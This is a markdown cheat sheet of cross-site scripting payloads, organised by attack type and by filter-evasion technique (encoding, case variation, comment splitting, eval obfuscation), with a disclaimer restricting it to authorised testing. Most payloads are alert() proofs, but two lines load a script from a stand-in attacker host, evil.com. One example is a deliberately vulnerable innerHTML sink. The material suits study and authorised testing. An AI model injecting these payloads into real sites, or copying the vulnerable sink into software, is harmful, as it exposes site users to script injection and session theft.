# XSS Attack Vectors

Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users.

## Types of XSS Attacks

There are three main types of XSS attacks:

1.  **Stored XSS (Persistent XSS)**
2.  **Reflected XSS (Non-Persistent XSS)**
3.  **DOM-based XSS**

---

## Stored XSS (Persistent XSS)

Stored XSS vulnerabilities occur when malicious script is injected directly into a target application. The injected script is then stored on the server (e.g., in a database, message forum, comment field, etc.) and is executed in the victim's browser when they view the page containing the stored malicious script.

### Examples:

#### Basic Script Injection
- **Description:** Injecting a simple script tag.
- **Payload:** `<script>alert('Stored XSS');</script>`

#### Image Tag with onerror Event
- **Description:** Using an image tag with an `onerror` event to execute script.
- **Payload:** `<img src="invalid-image" onerror="alert('Stored XSS from image');">`

---

## Reflected XSS (Non-Persistent XSS)

Reflected XSS vulnerabilities occur when a malicious script is reflected off a web application to the victim's browser. The script is typically embedded in a URL or other input data. When the victim clicks on a malicious link or submits a specially crafted form, the injected code travels to the vulnerable web site, which reflects the attack back to the victim’s browser.

### Examples:

#### URL Parameter Injection
- **Description:** Injecting script through a URL parameter.
- **Payload (URL):** `http://example.com/search?query=<script>alert('Reflected XSS');</script>`
- **Resulting HTML (simplified):** `<p>Search results for: <script>alert('Reflected XSS');</script></p>`

#### Form Input Injection
- **Description:** Injecting script through a form input field that is then displayed on the page.
- **Payload (in a form field):** `"><script>alert('Reflected XSS from form');</script>`

---

## DOM-based XSS

DOM-based XSS vulnerabilities occur when the client-side scripts write user-provided data to the Document Object Model (DOM). The data is subsequently read from the DOM by the web page and interpreted as HTML, leading to script execution. The vulnerability exists in the client-side code rather than the server-side code.

### Examples:

#### Modifying DOM via URL Fragment
- **Description:** Using the URL fragment (`#`) to inject script that is then processed by client-side JavaScript.
- **Payload (URL):** `http://example.com/page#<img src="invalid" onerror="alert('DOM-based XSS');">`
- **Client-side JavaScript (vulnerable example):**
  ```javascript
  // Vulnerable JavaScript that writes location.hash to the DOM
  document.getElementById('content').innerHTML = decodeURIComponent(window.location.hash.substring(1));
  ```

#### JavaScript eval() with User Input
- **Description:** Using `eval()` with unvalidated user input.
- **Payload:** User input that forms a malicious command, e.g., `alert('DOM-based XSS via eval')` passed to `eval()`.

---
## General XSS Vectors and Techniques

This section includes various XSS vectors and techniques that can be applied across different XSS types.

### HTML Injection

#### Script Tag
- **Description:** The most straightforward XSS vector.
- **Payload:** `<script>alert('XSS');</script>`
- **Alternative (external script):** `<script src="http://evil.com/xss.js"></script>`

#### Image Tag (`<img>`)
- **Description:** Using `onerror` or other event handlers with image tags.
- **Payload:** `<img src="x" onerror="alert('XSS from img onerror');">`
- **Payload (JavaScript source):** `<img src="javascript:alert('XSS from img javascript src');">` (Works in older browsers)

#### Anchor Tag (`<a>`)
- **Description:** Using `href` with `javascript:` URI scheme or event handlers like `onmouseover`.
- **Payload (javascript: URI):** `<a href="javascript:alert('XSS from a href');">Click me</a>`
- **Payload (event handler):** `<a href="#" onmouseover="alert('XSS from a onmouseover');">Hover over me</a>`

#### SVG Tag (`<svg>`)
- **Description:** SVGs can embed scripts.
- **Payload:** `<svg onload="alert('XSS from svg onload');"></svg>`
- **Payload (embedded script):** `<svg><script>alert('XSS from svg script');</script></svg>`

#### Object Tag (`<object>`)
- **Description:** Can embed external resources or data URIs that execute script.
- **Payload:** `<object data="javascript:alert('XSS from object data');"></object>`

#### Iframe Tag (`<iframe>`)
- **Description:** Embedding a page that executes JavaScript or using `srcdoc` or `javascript:` URI.
- **Payload (javascript: URI):** `<iframe src="javascript:alert('XSS from iframe src');"></iframe>`
- **Payload (srcdoc):** `<iframe srcdoc="<script>alert('XSS from iframe srcdoc');</script>"></iframe>`

### Event Handlers
Many HTML tags support event handlers that can be used for XSS.
- **Examples:** `onload`, `onerror`, `onmouseover`, `onclick`, `onfocus`, `onblur`, `onchange`, etc.
- **Generic Payload:** `<div onmouseover="alert('XSS from event handler');">Hover me</div>`

### JavaScript URI Scheme
- **Description:** Using `javascript:` directly in attributes that expect a URL.
- **Payload:** `<a href="javascript:alert('XSS');">Click</a>`
- **Payload in iframe:** `<iframe src="javascript:alert('XSS');"></iframe>`
- **Payload in object:** `<object data="javascript:alert('XSS');"></object>`
- **Payload in form action:** `<form action="javascript:alert('XSS');"><input type="submit"></form>`

### CSS-Based Attacks

#### Style Attribute
- **Description:** Using `expression()` (IE only) or `url()` with `javascript:` in style attributes.
- **Payload (expression - IE):** `<div style="width: expression(alert('XSS from style expression'));"></div>`
- **Payload (url - older browsers):** `<div style="background-image: url(javascript:alert('XSS from style url'));"></div>`

#### Style Tag (`<style>`)
- **Description:** Embedding CSS that can trigger XSS, often through `url()` or imported stylesheets.
- **Payload (url - older browsers):** `<style>body { background-image: url("javascript:alert('XSS from style tag')"); }</style>`
- **Payload (import):** `<style>@import 'javascript:alert("XSS from style import")';</style>` (Browser dependent)

### Encoding and Obfuscation

#### HTML Entities
- **Description:** Encoding characters to bypass simple filters.
- **Payload:** `<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS with HTML entities&#39;&#41;;">` (alerts 'XSS with HTML entities')

#### URL Encoding
- **Description:** Encoding characters in URL parameters.
- **Payload (in URL):** `http://example.com/?name=%3Cscript%3Ealert('XSS with URL encoding')%3C/script%3E`

#### Base64 Encoding
- **Description:** Encoding scripts, often used with `data:` URI scheme or `eval(atob())`.
- **Payload:** `<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIHdpdGggQmFzZTY0Jyk8L3NjcmlwdD4="></iframe>`

#### String Concatenation/Manipulation
- **Description:** Building malicious strings in JavaScript to avoid direct detection.
- **Payload:**
  ```html
  <script>
  var x = "al";
  var y = "ert";
  var z = "('XSS from string concat')";
  eval(x + y + z);
  </script>
  ```

#### Null Bytes
- **Description:** Using null bytes (`%00`) to truncate strings and bypass filters. (Effectiveness varies by system and context)
- **Payload:** `<img src="java%00script:alert('XSS with null byte');">`

#### Case Variations
- **Description:** Using mixed case to bypass case-sensitive filters.
- **Payload:** `<ScRiPt>alert('XSS with case variations');</ScRiPt>`
- **Payload:** `<IMG SRC="jAvAsCrIpT:alert('XSS');">`

### Filter Evasion Techniques

#### Malformed Tags
- **Description:** Using incomplete or malformed tags that browsers might still parse.
- **Payload:** `<img ""\"><script>alert("XSS from malformed img")</script>">`
- **Payload:** `<<script>alert('XSS from extra bracket');//<</script>`

#### No Closing Script Tags
- **Description:** Some browsers will execute script even if the closing tag is missing, or auto-insert it.
- **Payload:** `<script src="http://evil.com/xss.js?<bm>" >`

#### Comments within Tags/Scripts
- **Description:** Using comments to break up keywords.
- **Payload:** `<img src="java<!-- -->script:alert('XSS with comment');">`
- **Payload:** `<scr<!-- -->ipt>alert('XSS with comment in tag');</scr<!-- -->ipt>`

#### Using `eval()` with Obfuscated Strings
- **Description:** `eval()` can execute strings, which can be obfuscated.
- **Payload:** `<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));</script>` (alerts 'XSS')

#### Default SRC / HREF attributes
- **Description:** Using `#` or empty `src`/`href` attributes with event handlers.
- **Payload:** `<img src=# onerror="alert('XSS from default src')">`
- **Payload:** `<a href=# onmouseover="alert('XSS from default href')">Hover me</a>`

---
*Disclaimer: This list is for educational and testing purposes only. Always ensure you have explicit permission before testing any application for XSS vulnerabilities.*
